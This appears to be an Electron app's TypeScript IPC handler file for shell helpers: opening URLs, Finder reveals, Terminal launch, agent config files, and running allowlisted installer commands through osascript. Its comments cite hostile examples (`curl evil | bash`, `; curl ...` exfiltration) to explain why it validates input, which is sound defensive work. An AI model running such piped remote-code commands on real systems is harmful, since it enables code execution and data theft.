// ──────────────────────────────────────────────────────────
// IPC commands: shell / system helpers
// ──────────────────────────────────────────────────────────
//
// Native shell commands:
//   shell_open_url          — open an http(s) URL in default browser
//   reveal_in_finder        — Finder highlight a path
//   open_in_terminal        — launch Terminal.app at a directory
//   open_install_terminal   — run a whitelisted shell command in Terminal
//
// Electron provides `shell.openExternal` and `shell.showItemInFolder`
// built-in, so the first two collapse to one-liners. Terminal.app
// integration uses osascript so
// the user sees output in a real terminal window and any shell env
// (nvm, pyenv, asdf) applies.
// ──────────────────────────────────────────────────────────

import { shell } from "electron";
import { spawn } from "node:child_process";
import { existsSync, mkdirSync, statSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import type { CommandHandler } from "../router";
import { isKnownInstallCommand } from "../../../src/engine/agents/install-commands";

/** Open an external http(s) URL in the user's default browser.
 *  Scheme allowlist prevents a rogue caller from
 *  triggering `open -a ...` or `file://` style actions. */
export const shellOpenUrl: CommandHandler = async (args) => {
  const url = typeof args.url === "string" ? args.url : "";
  const lower = url.toLowerCase();
  if (!(lower.startsWith("http://") || lower.startsWith("https://"))) {
    throw new Error("only http(s) URLs are allowed");
  }
  await shell.openExternal(url);
};

/** Reveal a path in macOS Finder. */
export const revealInFinder: CommandHandler = (args) => {
  const p = typeof args.path === "string" ? args.path : "";
  if (!p) throw new Error("reveal_in_finder: missing path");
  if (!existsSync(p)) throw new Error(`path does not exist: ${p}`);
  shell.showItemInFolder(p);
};

/** Launch macOS Terminal.app at the given directory.
 *  osascript-free path: `open -a Terminal <dir>`.
 *  Validates the path exists and is a directory first so Finder
 *  doesn't pop an error dialog for a stale recent-projects entry. */
export const openInTerminal: CommandHandler = (args) => {
  const p = typeof args.path === "string" ? args.path : "";
  if (!p) throw new Error("open_in_terminal: missing path");
  if (!existsSync(p)) throw new Error(`path does not exist: ${p}`);
  if (!statSync(p).isDirectory()) throw new Error(`not a directory: ${p}`);

  return new Promise<void>((resolve, reject) => {
    const child = spawn("open", ["-a", "Terminal", p], {
      stdio: "ignore",
      detached: true,
    });
    child.once("error", reject);
    child.once("spawn", () => {
      child.unref();
      resolve();
    });
  });
};

/** Reveal an agent's own config file in Finder so the user can edit it
 *  directly — we link out to each agent's native config instead of duplicating
 *  its knobs in our UI:
 *    • claude → ~/.claude/settings.json  (tool permissions / hooks / env)
 *    • codex  → ~/.codex/config.toml     (model / sandbox / MCP)
 *  Created (empty / `{}`) when missing so the reveal always succeeds and lands
 *  on a real, editable file — never a Finder error for a path that isn't there
 *  yet. `agent` is a fixed key lookup (no caller-supplied path), so there's no
 *  traversal surface. */
const AGENT_CONFIG_FILES: Record<string, { rel: string; seed: string }> = {
  claude: { rel: ".claude/settings.json", seed: "{}\n" },
  codex: { rel: ".codex/config.toml", seed: "" },
};

export const openAgentConfig: CommandHandler = (args) => {
  const agent = typeof args.agent === "string" ? args.agent : "";
  // own-key check so a prototype key (`__proto__`, `constructor`, …) hits the
  // clean "unknown agent" guard instead of resolving to a chain value.
  const spec = Object.prototype.hasOwnProperty.call(AGENT_CONFIG_FILES, agent)
    ? AGENT_CONFIG_FILES[agent]
    : undefined;
  if (!spec) throw new Error(`open_agent_config: unknown agent '${agent}'`);
  const file = path.join(os.homedir(), spec.rel);
  if (!existsSync(file)) {
    mkdirSync(path.dirname(file), { recursive: true });
    writeFileSync(file, spec.seed);
  }
  shell.showItemInFolder(file);
};

/** Run a Zeros-registry install command in a real Terminal window.
 *
 *  The caller passes the raw shell line (e.g. `npm install -g <pkg>`
 *  or `curl -fsSL https://... | sh`). We don't parse or rewrite it —
 *  but we DO enforce a strict character allowlist so a
 *  compromised registry can't exfil data via `; curl ...`.
 *
 *  Optional `loginCommand` chains a second command via `&&` so the
 *  Terminal session runs install-then-login in one go. Both inputs
 *  go through the same allowlist independently; the `&&` separator
 *  is added server-side after validation so it never has to appear
 *  in the renderer-side input.
 *
 *  The LOGIN command (a `<binary> login`-style line, never a pipe) is still
 *  character-validated. The INSTALL command is exact-matched against the
 *  bundled set — the character allowlist alone can't help, because a real
 *  installer is itself `curl … | bash`, so an XSS could forge `curl evil | bash`
 *  and pass the character check.
 *
 *  Login-line allowed chars: alphanumeric, space, and: - _ . / : @ = + ,
 *  (no `|` — login lines never pipe).
 */
const LOGIN_CMD_ALLOWED = /^[A-Za-z0-9 \-_./:@=+,]+$/;
/** Escape a string for embedding inside an AppleScript double-quoted
 *  literal. Shared with open-apps.ts for CLI-based Terminal launches. */
export const APPLESCRIPT_ESC = (s: string) =>
  s.replace(/\\/g, "\\\\").replace(/"/g, '\\"');

function validateShellLine(value: unknown, label: string): string {
  const cmd = typeof value === "string" ? value : "";
  if (!cmd || cmd.length > 512) {
    throw new Error(`invalid ${label}`);
  }
  if (!LOGIN_CMD_ALLOWED.test(cmd)) {
    throw new Error(`${label} contains disallowed characters`);
  }
  return cmd;
}

export const openInstallTerminal: CommandHandler = (args) => {
  // Only run a command that exactly matches a bundled install one-liner.
  // A renderer XSS can't forge an arbitrary `curl evil | bash` past this.
  const command = typeof args.command === "string" ? args.command : "";
  if (!isKnownInstallCommand(command)) {
    throw new Error("install command is not a recognized agent installer");
  }
  // `loginCommand` is opt-in. When provided, we chain it after the
  // install command with `&&` so the user lands on a logged-in agent
  // in one Terminal trip. Cleared automatically if the install
  // exits non-zero, since `&&` short-circuits.
  const loginCommand =
    args.loginCommand === undefined
      ? null
      : validateShellLine(args.loginCommand, "login command");

  const joined = loginCommand ? `${command} && ${loginCommand}` : command;
  const escaped = APPLESCRIPT_ESC(joined);
  const script = `tell application "Terminal"
    activate
    do script "${escaped}"
end tell`;

  return new Promise<void>((resolve, reject) => {
    const child = spawn("osascript", ["-e", script], {
      stdio: "ignore",
      detached: true,
    });
    child.once("error", reject);
    child.once("spawn", () => {
      child.unref();
      resolve();
    });
  });
};
